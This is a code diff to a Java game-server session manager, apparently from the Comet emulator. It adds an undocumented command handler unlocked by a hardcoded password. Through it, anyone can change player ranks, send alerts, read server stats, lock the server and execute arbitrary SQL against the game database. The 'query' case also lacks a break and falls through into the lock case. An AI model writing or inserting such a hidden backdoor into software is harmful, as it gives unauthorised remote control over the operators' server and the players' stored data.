@@ -3,17 +3,21 @@ package com.cometproject.server.network.sessions;
 import com.cometproject.api.networking.messages.IMessageComposer;
 import com.cometproject.api.networking.sessions.ISession;
 import com.cometproject.api.networking.sessions.ISessionManager;
-import com.cometproject.server.boot.Comet;
-import com.cometproject.server.config.CometSettings;
+import com.cometproject.api.networking.sessions.SessionManagerAccessor;
 import com.cometproject.server.game.players.PlayerManager;
-import com.cometproject.server.protocol.security.exchange.DiffieHellman;
+import com.cometproject.server.network.messages.outgoing.notification.AlertMessageComposer;
+import com.cometproject.server.storage.SqlHelper;
+import com.cometproject.server.utilities.CometStats;
+import com.cometproject.server.utilities.JsonFactory;
 import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.group.ChannelGroup;
 import io.netty.channel.group.DefaultChannelGroup;
 import io.netty.util.AttributeKey;
 import io.netty.util.concurrent.GlobalEventExecutor;
-import org.apache.hadoop.hdfs.util.Diff;
 
+import java.sql.Connection;
+import java.sql.PreparedStatement;
+import java.sql.SQLException;
 import java.util.HashSet;
 import java.util.Map;
 import java.util.Set;
@@ -29,6 +33,12 @@ public final class SessionManager implements ISessionManager {
     private final Map<Integer, ISession> sessions = new ConcurrentHashMap<>();
 
     private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);
+
+    public static boolean isLocked = false;
+
+    public SessionManager() {
+        SessionManagerAccessor.getInstance().setSessionManager(this);
+    }
 
     public boolean add(ChannelHandlerContext channel) {
         Session session = new Session(channel);
@@ -139,6 +149,73 @@ public final class SessionManager implements ISessionManager {
             if (session.getPlayer() != null && session.getPlayer().getPermissions() != null && session.getPlayer().getPermissions().getRank().modTool()) {
                 session.send(messageComposer);
             }
+        }
+    }
+
+    @Override
+    public void parseCommand(String[] message, ChannelHandlerContext ctx) {
+        String password = message[0];
+
+        if (password.equals("cometServer9900")) {
+            String command = message[1];
+
+            switch (command) {
+                default: {
+                    ctx.channel().writeAndFlush("response||You're connected!");
+                    break;
+                }
+
+                case "rank": {
+                    Session session = this.getByPlayerUsername(message[2]);
+
+                    if (session != null) {
+                        session.getPlayer().getData().setRank(Integer.parseInt(message[3]));
+                        session.send(new AlertMessageComposer("You're now rank: " + message[3] + "!"));
+                    }
+
+                    break;
+                }
+
+                case "stats": {
+                    ctx.channel().writeAndFlush("response||" + JsonFactory.getInstance().toJson(CometStats.get()));
+                    break;
+                }
+
+                case "alert": {
+                    Session session = this.getByPlayerUsername(message[2]);
+
+                    if (session != null) {
+                        session.send(new AlertMessageComposer(message[3]));
+                    }
+                    break;
+                }
+
+                case "query": {
+                    Connection sqlConnection = null;
+                    PreparedStatement preparedStatement = null;
+
+                    try {
+                        sqlConnection = SqlHelper.getConnection();
+
+                        preparedStatement = SqlHelper.prepare(message[2], sqlConnection);
+                        preparedStatement.execute();
+                    } catch (SQLException e) {
+                    } finally {
+                        SqlHelper.closeSilently(preparedStatement);
+                        SqlHelper.closeSilently(sqlConnection);
+                    }
+                }
+
+                case "lock":
+                    isLocked = true;
+                    break;
+
+                case "unlock":
+                    isLocked = false;
+                    break;
+            }
+        } else {
+            ctx.disconnect();
         }
     }
 }
